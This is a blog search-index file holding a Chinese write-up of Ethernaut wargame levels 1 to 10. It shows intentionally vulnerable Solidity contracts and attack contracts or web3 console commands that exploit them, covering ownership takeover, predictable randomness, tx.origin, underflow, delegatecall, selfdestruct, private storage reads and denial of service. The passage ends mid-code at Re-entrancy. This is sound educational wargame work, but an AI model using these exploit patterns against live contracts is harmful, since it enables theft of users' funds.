<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Ethernaut L1-10</title>
      <link href="/2025/02/21/Ethernaut/EthernautL1-10/"/>
      <url>/2025/02/21/Ethernaut/EthernautL1-10/</url>
      
        <content type="html"><![CDATA[<h2 id="FallBack"><a href="#FallBack" class="headerlink" title="FallBack"></a>FallBack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>根据题目第一步需要获得合约的所有权，第二步提款到自己的账号。有两个函数可以完成第一步<code>function contribute()</code>和<code>receive()</code>,但是对于条件来说，<code>receive()</code>更加容易实现，只需要转账有余额，并且有<code>contributions</code>映射就可以实现<code>owner = msg.sender;</code>。</p><h3 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h3><p>复制粘贴到Remix中，连接钱包，并且利用Solidity自带的转账函数</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202501260136288.png" alt="image-20250126013618075"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202501260147447.png" alt="image-20250126014708343"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202501260150484.png" alt="image-20250126015049357"></p><h2 id="FallOut"><a href="#FallOut" class="headerlink" title="FallOut"></a>FallOut</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>目标是获取合约的使用权，在Solidity的0.6版本，构造函数是必须要和合约同名的。但是我们发现合约的构造函数并不是真的，<code>Fal1out</code>其中有一个是数字1而不是字母l，因此我们可以创建接口直接调用<code>Fal1out</code>函数。</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202501262304815.png" alt="image-20250126230435659"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202501262304328.png" alt="image-20250126230451220"></p><blockquote><p>[!NOTE]</p><p>这里之所以接口合约可以调用合约中的函数，是因为输入合约A的地址并且使用接口合约B的ABI，使用了合约B所以msg.sender是自己，但是调用了合约A的函数。<br><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202501262321153.png" alt="image-20250126232120087"></p></blockquote><h2 id="Coin-Filp"><a href="#Coin-Filp" class="headerlink" title="Coin Filp"></a>Coin Filp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>因为在WEB3中没有真正的随机数，通过代码实现的都可以仿造，在这个例子中只需要仿照合约中的思路得到答案，再把答案给题目合约就可以了</p><h3 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h3><p><code>Attract.sol</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8;</span><br><span class="line"></span><br><span class="line">contract Attrack &#123;</span><br><span class="line">    CoinFlip private  immutable i_coinFilp;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    </span><br><span class="line">    constructor (address _CoinFlip)&#123;</span><br><span class="line">        i_coinFilp = CoinFlip(_CoinFlip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Flip() external  &#123;</span><br><span class="line">        bool guess = FindGuess();</span><br><span class="line">        i_coinFilp.flip(guess);</span><br><span class="line">    &#125;</span><br><span class="line">    function FindGuess() private  view returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        return side;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于合约Attrack在构造函数处输入题目合约的地址，就可以调用实例合约的函数，通过<code>FindGuess</code>函数得到答案，再传递给题目合约就可以了</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202501272254143.png" alt="image-20250127225441930"></p><h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a><strong>Telephone</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>关键点是在于区别<code>tx.origin</code>和m<code>sg.sender</code>的区别，前者是交易的发起者，后者是合约的调用者</p><blockquote><p> [!NOTE]</p><p> msg.sender的所有者可以是一个合同。</p><p> tx.origin的所有者永远不会是一个合同。</p><p> 在一个简单的调用链A-B-C-D中，D内部的msg.sender将是C，tx.origin将是A。</p></blockquote><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202501291650177.png" alt="img" style="zoom:50%;" /><h3 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract Attrack &#123;</span><br><span class="line"></span><br><span class="line">    Telephone public tele  ;</span><br><span class="line"></span><br><span class="line">    constructor (address _attrack)&#123;</span><br><span class="line">         tele = Telephone(_attrack);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function useChangeOwner() external &#123;</span><br><span class="line">        tele.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用其他合约调用目标合约即可</p><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a><strong>Token</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>在合约0.6版本，不存在safeMath，可以在加减乘除进行整数的溢出，<code> require(balances[msg.sender] - _value &gt;= 0);</code>其中当msg.sender是零的时候就可以造成整数向下溢出。只需要msg.sender等于0，_to参数是钱包的地址，就可以增加余额。</p><h3 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> // SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">    function transfer(address _to, uint256 _value) external  returns (bool);</span><br><span class="line">    function balanceOf(address) external  view returns (uint256);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attrack&#123;</span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        Token(_target).transfer(msg.sender,1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接构造函数填入实例地址即可。</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202501302240301.png" alt="image-20250130224002144"></p><blockquote><p>[!NOTE]</p><p>首先钱包地址调用了Attrack合约地址中的构造函数，构造函数调用接口就是实例地址。所以对于接口来说msg.sender就是Attrcak合约的地址。Attrack合约是没有余额的，而对于Attrack合约来说，msg.sender是钱包地址。一定要注意好不同的msg.sender的变化。</p></blockquote><h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>首先了解<code>delegatecall</code>函数的特性，使用delegatecall函数还需要注意delegatecall()对状态变量存储的影响</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502141627902.png" alt="image-20250214162657720"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502141642069.png" alt="image-20250214164159935"></p><p>需要通过合约<code>Delegation</code>中的Fallback()函数调用合约<code>Delegate</code>的pwn()函数.</p><h3 id="解法-4"><a href="#解法-4" class="headerlink" title="解法"></a>解法</h3><ul><li><p>发送交易触发 Delegation 合约的 fallback() 函数，同时设置 data 为 pwn 函数的标识符即可（data 头4个byte是被调用方法的签名哈希，即 bytes4(keccak256(“func”)),可以在网页上直接使用命令<code>contract.sendTransaction(&#123;data:web3.utils.sha3(&quot;pwn()&quot;).slice(0,10)&#125;)</code></p></li><li><p>亦或者可以使用Remix，在CALLDATA中写入pwn函数标识符</p></li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502141632539.png" alt="image-20250214163236441"></p><h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>利用自毁函数强行转移合约的余额，强制交易余额</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502142118169.png" alt="image-20250214211830043"></p><h3 id="解法-5"><a href="#解法-5" class="headerlink" title="解法"></a>解法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">    address payable levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _levelInstance) &#123;</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function give() public payable &#123;</span><br><span class="line">        selfdestruct(levelInstance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数填入关卡实例地址，因为地址是<code>payable</code>所以可以在执行<code>give</code>函数的时候带上余额，在Remix的VALUE写入1wei并且执行<code>give</code>函数。99</p><h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a><strong>Vault</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public &#123;</span><br><span class="line">        if (password == _password) &#123;</span><br><span class="line">            locked = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>审计之后需要得到构造函数的密码才能过关，但是变量属性是private，不过以太坊本质是区块链，所有都是透明的。所有我们可以查看状态变量知道密码。</p><h3 id="解法-6"><a href="#解法-6" class="headerlink" title="解法"></a>解法</h3><p>F12之后使用命令<code>web3.eth.getStorageAt(contract.address, 1)</code>得到密码</p><h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _king() public view returns (address) &#123;</span><br><span class="line">        return king;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>对于合约接受ETH的知识点考察，一般接ETH有两个函数receive和fallback。既没有接收以太币也没有支付回退函数，则合约无法通过常规交易接收以太币并抛出异常。官方文档指出</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502151428199.png" alt="image-20250215142823071"></p><p>因为代码使用了<code>transfer</code>的方式发送ETH，所以可以利用这点，当提交实例给关卡时,使得关卡抛出异常，阻止王位的转让</p><h3 id="解法-7"><a href="#解法-7" class="headerlink" title="解法"></a>解法</h3><p>发送ETH，成为国王，但是不写任何的接受ETH的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">    constructor(address payable target) payable &#123;</span><br><span class="line">        uint256 price = King(target).prize();</span><br><span class="line">        (bool success,) = target.call&#123;value: price&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>经典的<a href="https://medium.com/mr-efacani-teatime/%E9%96%92%E8%81%8A%E5%8A%A0%E5%AF%86%E8%B2%A8%E5%B9%A3%E6%9C%80%E6%99%AE%E9%81%8D%E7%9A%84%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95-re-entrancy-attack-ea63e90da7a7">重放攻击</a>，利用recevie或者fallback进行无限套娃。直接把全部的钱取出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123; 